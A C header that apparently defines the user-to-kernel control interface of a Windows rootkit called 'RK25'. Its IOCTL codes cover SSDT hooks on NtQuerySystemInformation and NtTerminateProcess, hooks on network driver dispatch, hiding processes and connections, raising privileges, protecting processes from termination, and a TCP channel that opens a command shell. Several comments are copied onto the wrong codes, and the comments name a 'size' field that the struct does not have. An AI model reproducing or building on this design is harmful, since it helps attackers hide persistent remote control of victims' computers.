#ifndef _RK25_IOCTL_H_
#define _RK25_IOCTL_H_

#if defined(_NTDDK_)
#include <ntddk.h>
#else
#include <Windows.h>
#endif
/*
* * * * * * * * IOCTL Methods * * * * * * * * *
* METHOD_BUFFERED:
* copy buffer from user-space to kernel-space
* 
* METHOD_NEITHER:
* direct buffer access (buffer is not copied)
* 
* METHOD_IN_DIRECT | METHOD_OUT_DIRECT:
* MDL buffers (IN - SystemBuffer, OUT - UserBuffer) with IoAllocateMdl allocation
* * * * * * * * IOCTL Methods * * * * * * * * *
*/

/*
* * * * * * * * * IOCTL Access * * * * * * * * * *
* FILE_ANY_ACCESS		- No access restrictions
* FILE_READ_ACCESS		- Allow read data
* FILE_WRITE_ACCESS		- Allow write data
* FILE_SPECIAL_ACCESS	- Disable security checks (ACL or Access Control List)
* * * * * * * * * IOCTL Access * * * * * * * * * *
*/

// ------------------------------------------------------------TESTING IOCTL------------------------------------------------------------
#if DBG
/*
* TEST IOCTL WITH METHOD_BUFFERED:
*
* STATUS_SUCCESS:
*	RK25_IOCTL_BUFFER.size = <size>
*	RK25_IOCTL_BUFFER.buffer = <pointer_to_str>
*	<size> == retbytes
*/
#define RK25_IOCTL_TEST_BUFFERED		CTL_CODE(FILE_DEVICE_UNKNOWN, 0x001, METHOD_BUFFERED, FILE_READ_ACCESS | FILE_WRITE_ACCESS)

/*
* TEST IOCTL WITH METHOD_NEITHER:
*
* STATUS_SUCCESS:
*	RK25_IOCTL_BUFFER in.size == <size_in>
*	RK25_IOCTL_BUFFER in.buffer == <pointer_to_str_in>
*
*	RK25_IOCTL_BUFFER out.size == <size_out>
*	RK25_IOCTL_BUFFER out.buffer == <pointer_to_str_out>
* 
*	in.size == out.size == retbytes && !strcmp(<pointer_to_str_in>, <pointer_to_str_out>)
*/
#define RK25_IOCTL_TEST_NEITHER			CTL_CODE(FILE_DEVICE_UNKNOWN, 0x002, METHOD_NEITHER, FILE_READ_ACCESS | FILE_WRITE_ACCESS)
#endif
// ------------------------------------------------------------TESTING IOCTL------------------------------------------------------------

/*
* x86/x64 hook/unhook SSDT NtQuerySystemInformation
* used methods: replace address and splicing
*/
#define RK25_IOCTL_HOOK_SSDT_QUERY		CTL_CODE(FILE_DEVICE_UNKNOWN, 0x991, METHOD_BUFFERED, FILE_READ_ACCESS | FILE_WRITE_ACCESS)

/*
* x86/x64 hook/unhook SSDT NtTerminateProcess
* used methods: replace address and splicing
*/
#define RK25_IOCTL_HOOK_SSDT_TERM		CTL_CODE(FILE_DEVICE_UNKNOWN, 0x992, METHOD_BUFFERED, FILE_READ_ACCESS | FILE_WRITE_ACCESS)

/*
* x86/x64 hook/unhook IRP Net Device
* used methods: hook dispatcher
*/
#define RK25_IOCTL_HOOK_NET				CTL_CODE(FILE_DEVICE_UNKNOWN, 0x993, METHOD_BUFFERED, FILE_READ_ACCESS | FILE_WRITE_ACCESS)

// ------------------------------------------------------------PROCESS IOCTL------------------------------------------------------------
/*
* IOCTL HIDE PROCESS:
* 
* STATUS_SUCCESS:
*	if RK25_IOCTL_BUFFER.size == 0	then RK25_IOCTL_BUFFER.buffer == <pid>			and return retbytes == <pid>
*	if RK25_IOCTL_BUFFER.size > 0	then RK25_IOCTL_BUFFER.buffer == <process_name> and return retbytes == strlen(<process_name>)
*/
#define RK25_IOCTL_PROC_HIDE			CTL_CODE(FILE_DEVICE_UNKNOWN, 0x101, METHOD_BUFFERED, FILE_READ_ACCESS | FILE_WRITE_ACCESS)
/*
* IOCTL HIDE PROCESS:
*
* STATUS_SUCCESS:
*	if RK25_IOCTL_BUFFER.size == 0	then RK25_IOCTL_BUFFER.buffer == <pid>			and return retbytes == <pid>
*	if RK25_IOCTL_BUFFER.size > 0	then RK25_IOCTL_BUFFER.buffer == <process_name> and return retbytes == strlen(<process_name>)
*/
#define RK25_IOCTL_PROC_PRIV			CTL_CODE(FILE_DEVICE_UNKNOWN, 0x102, METHOD_BUFFERED, FILE_READ_ACCESS | FILE_WRITE_ACCESS)
/*
* IOCTL HIDE PROCESS:
*
* STATUS_SUCCESS:
*	if RK25_IOCTL_BUFFER.size == 0	then RK25_IOCTL_BUFFER.buffer == <pid>			and return retbytes == <pid>
*	if RK25_IOCTL_BUFFER.size > 0	then RK25_IOCTL_BUFFER.buffer == <process_name> and return retbytes == strlen(<process_name>)
*/
#define RK25_IOCTL_PROC_PROTECT			CTL_CODE(FILE_DEVICE_UNKNOWN, 0x104, METHOD_BUFFERED, FILE_READ_ACCESS | FILE_WRITE_ACCESS)
// ------------------------------------------------------------PROCESS IOCTL------------------------------------------------------------


#define RK25_IOCTL_NET_HIDE				CTL_CODE(FILE_DEVICE_UNKNOWN, 0x201, METHOD_BUFFERED, FILE_READ_ACCESS | FILE_WRITE_ACCESS)
#define RK25_IOCTL_TCP_OPEN_TO_CMD		CTL_CODE(FILE_DEVICE_UNKNOWN, 0x202, METHOD_BUFFERED, FILE_READ_ACCESS | FILE_WRITE_ACCESS)
#define RK25_IOCTL_TCP_OPEN_TO_READ		CTL_CODE(FILE_DEVICE_UNKNOWN, 0x204, METHOD_BUFFERED, FILE_READ_ACCESS | FILE_WRITE_ACCESS)



typedef struct _RK25_IOCTL_BUFFER {
	ULONG attr;
	PVOID buffer;
} RK25_IOCTL_BUFFER, RK25_IB, *PRK25_IB;

#endif // _RK25_IOCTL_H_